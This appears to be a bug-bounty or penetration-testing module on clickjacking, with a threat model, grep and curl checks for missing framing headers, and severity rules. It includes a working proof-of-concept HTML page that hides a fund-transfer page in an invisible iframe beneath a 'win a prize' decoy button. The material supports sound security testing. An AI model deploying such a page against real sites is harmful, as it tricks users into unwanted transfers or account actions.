# VULN MODULE — Clickjacking
# Asset: webapp
# CWE-1021 | Report prefix: WEB-CLICK

## THREAT MODEL

Clickjacking embeds the target site in an invisible iframe. When the victim
clicks on the attacker's visible UI, they unknowingly click on the target
site's UI underneath. Requires: the target page can be framed (no X-Frame-Options
or permissive CSP frame-ancestors).

## WHITEBOX PATTERNS

```bash
# Check for framing protection headers
grep -rn "X-Frame-Options\|frame-ancestors\|frameguard" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.conf"
# Missing = frameable

# Check middleware
grep -rn "helmet\b" --include="*.js" -A5   # Node.js helmet sets X-Frame-Options
grep -rn "SECURE_BROWSER_XSS_FILTER\|X_FRAME_OPTIONS" --include="*.py" # Django
```

## DETECTION

```bash
# Check headers on target pages
curl -sI https://target.com/dashboard | grep -i "x-frame-options\|content-security-policy"
curl -sI https://target.com/transfer | grep -i "x-frame-options\|content-security-policy"

# CSP frame-ancestors check:
# frame-ancestors 'none'  → cannot be framed (safe)
# frame-ancestors 'self'  → can be framed by same origin only (safe)
# No CSP or no frame-ancestors + no X-Frame-Options → vulnerable
```

## POC TEMPLATE

```html
<!-- clickjacking_poc.html -->
<!DOCTYPE html>
<html>
<head>
<style>
  #target {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0;         /* set to 0.5 to visualize for testing */
    z-index: 2;
    border: none;
  }
  #decoy-button {
    position: absolute;
    top: 300px; left: 200px;  /* align with target's sensitive button */
    z-index: 1;
    padding: 20px;
    background: red;
    color: white;
    cursor: pointer;
    font-size: 18px;
  }
</style>
</head>
<body>
<div id="decoy-button">Click here to win a prize!</div>
<iframe id="target" src="https://target.com/transfer?to=attacker&amount=1000">
</iframe>
</body>
</html>
```

## SEVERITY CALIBRATION

Clickjacking is ONLY valid when:
- The framed page performs a sensitive action (fund transfer, password change,
  account deletion, OAuth authorization, admin action)
- No CSRF token needed (or token is embedded in the frame)
- User interaction beyond a single click is not required

NOT VALID when:
- Page has no sensitive action (informational pages, read-only content)
- The sensitive action requires keyboard input (attackers can't control keyboard)
- Requires double-click or very precise cursor positioning
- SAMEORIGIN or DENY header is present (already protected)

Most programs rate clickjacking as Low or Informative unless a specific
attack chain is demonstrated with clear account impact.
